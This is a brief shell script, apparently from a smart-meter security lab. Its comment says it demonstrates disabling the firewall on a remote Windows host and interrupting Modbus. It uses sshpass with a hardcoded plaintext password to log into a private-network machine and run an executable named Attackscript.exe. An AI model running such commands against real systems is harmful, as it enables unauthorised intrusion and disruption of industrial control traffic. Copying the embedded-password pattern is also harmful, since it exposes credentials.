#!/bin/sh

# Description: This file/script demostrates the disabling of Firewall on the remote Windows Host System
# Tag: Interrupt ModBus    
sshpass -p 'Student12345@' ssh -t student@172.16.2.223 -o ConnectTimeout=5 "cd \"C:\Windows\Temp\SmartMetertest\" && Attackscript.exe 6"